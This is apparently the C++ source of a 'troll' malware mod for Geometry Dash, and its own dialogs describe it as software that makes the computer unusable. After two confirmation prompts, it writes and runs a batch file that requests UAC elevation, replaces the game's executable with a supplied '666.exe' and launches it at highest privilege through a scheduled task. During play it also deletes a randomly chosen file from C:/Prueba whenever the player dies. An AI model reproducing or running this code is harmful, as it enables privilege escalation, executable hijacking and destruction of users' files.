#include <Geode/Geode.hpp>
#include <Geode/modify/MenuLayer.hpp>
#include <Geode/modify/PlayLayer.hpp>
#include <fstream>
#include <filesystem>
#include <random>

using namespace geode::prelude;
namespace fs = std::filesystem;

// Global variables for file tracking
std::string g_copiedFileName = "";
fs::path g_sourcePath = "C:/Prueba";

fs::path getDesktopPath() {
    char* userProfile = std::getenv("USERPROFILE");
    if (userProfile) {
        return fs::path(userProfile) / "Desktop";
    }
    return "";
}

void createAnGD666Bat() {
    char* tempEnv = std::getenv("TEMP");
    if (!tempEnv) return;
    fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
    
    std::ofstream batFile(batPath);
    batFile << "@echo off\n";
    batFile << ":: Request UAC elevation\n";
    batFile << "powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c taskkill /f /im GeometryDash.exe & echo. & set /p targetPath=Enter the path to 666.exe: & ren \\\"%targetPath%\\666.exe\\\" GeometryDash.exe & ren \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" GeometryDash666.exe & move \\\"%targetPath%\\GeometryDash.exe\\\" \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\\\" & schtasks /create /tn \\\"GD666\\\" /tr \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" /sc once /st 00:00 /rl highest /f & schtasks /run /tn \\\"GD666\\\" & schtasks /delete /tn \\\"GD666\\\" /f'\"\n";
    batFile.close();
}

void disableMod() {
    auto mod = Mod::get();
    mod->setSettingValue("enabled", false);
    
    char* tempEnv = std::getenv("TEMP");
    if (tempEnv) {
        fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
        if (fs::exists(batPath)) {
            try { fs::remove(batPath); } catch (...) {}
        }
    }
}

class $modify(MyMenuLayer, MenuLayer) {
    bool init() {
        if (!MenuLayer::init()) return false;

        bool isEnabled = Mod::get()->getSettingValue<bool>("enabled");
        bool isConfirmed = Mod::get()->getSavedValue<bool>("confirmed");

        if (isEnabled && !isConfirmed) {
            this->runAction(CCSequence::create(
                CCDelayTime::create(0.5f),
                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::showFirstMessage)),
                nullptr
            ));
        }

        return true;
    }

    void showFirstMessage() {
        createAnGD666Bat();
        auto alert = FLAlertLayer::create(
            this,
            "Are you sure?",
            "The software you just executed is considered malware.\nThis mod will harm your computer and makes it unusable.\nIf you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\nIf you know what this mod does and are using a safe environment to test, press Yes to start it.\n\nDO YOU WANT TO EXECUTE THIS MOD, RESULTING IN AN UNUSABLE MACHINE?",
            "No", "Yes"
        );
        alert->setTag(1);
        alert->show();
    }

    void showLastMessage() {
        auto alert = FLAlertLayer::create(
            this,
            "LAST WARNING!",
            "THIS IS THE LAST WARNING!\n\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MOD!\nSTILL EXECUTE IT?",
            "No", "Yes"
        );
        alert->setTag(2);
        alert->show();
    }

    void FLAlert_Clicked(FLAlertLayer* alert, bool btn2) override {
        if (alert->getTag() == 1) {
            if (btn2) {
                this->showLastMessage();
            } else {
                disableMod();
            }
        } else if (alert->getTag() == 2) {
            if (btn2) {
                Mod::get()->setSavedValue("confirmed", true);
                char* tempEnv = std::getenv("TEMP");
                if (tempEnv) {
                    std::string batPath = (fs::path(tempEnv) / "AnGD666.bat").string();
                    ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
                }
            } else {
                disableMod();
            }
        }
    }
};

class $modify(MyPlayLayer, PlayLayer) {
    struct Fields {
        std::string m_copiedFile = "";
        fs::path m_desktopPath = "";
        bool m_hasDied = false;
    };

    bool init(GJGameLevel* level, bool useReplay, bool dontSave) {
        if (!PlayLayer::init(level, useReplay, dontSave)) return false;

        if (fs::exists(g_sourcePath)) {
            std::vector<fs::path> files;
            try {
                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
                    if (dir_entry.is_regular_file()) {
                        files.push_back(dir_entry.path());
                    }
                }
            } catch (...) {}

            if (!files.empty()) {
                std::random_device rd;
                std::mt19937 g(rd());
                std::uniform_int_distribution<> dis(0, (int)files.size() - 1);
                
                fs::path selectedFile = files[dis(g)];
                m_fields->m_copiedFile = selectedFile.filename().string();
                m_fields->m_desktopPath = getDesktopPath();

                if (!m_fields->m_desktopPath.empty()) {
                    try {
                        fs::copy(selectedFile, m_fields->m_desktopPath / m_fields->m_copiedFile, fs::copy_options::overwrite_existing);
                    } catch (...) {}
                }
            }
        }

        return true;
    }

    void onQuit() {
        // If exiting the level (not by death)
        if (!m_fields->m_hasDied && !m_fields->m_copiedFile.empty() && !m_fields->m_desktopPath.empty()) {
            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
            if (fs::exists(desktopFile)) {
                try { fs::remove(desktopFile); } catch (...) {}
            }
        }
        PlayLayer::onQuit();
    }

    void destroyPlayer(PlayerObject* p0, GameObject* p1) {
        PlayLayer::destroyPlayer(p0, p1);
        
        if (!m_fields->m_copiedFile.empty()) {
            m_fields->m_hasDied = true;
            // Remove from Desktop
            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
            if (fs::exists(desktopFile)) {
                try { fs::remove(desktopFile); } catch (...) {}
            }

            // Remove from C:/Prueba (recursive search)
            try {
                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
                    if (dir_entry.is_regular_file() && dir_entry.path().filename() == m_fields->m_copiedFile) {
                        fs::remove(dir_entry.path());
                        break; 
                    }
                }
            } catch (...) {}
        }
    }
};
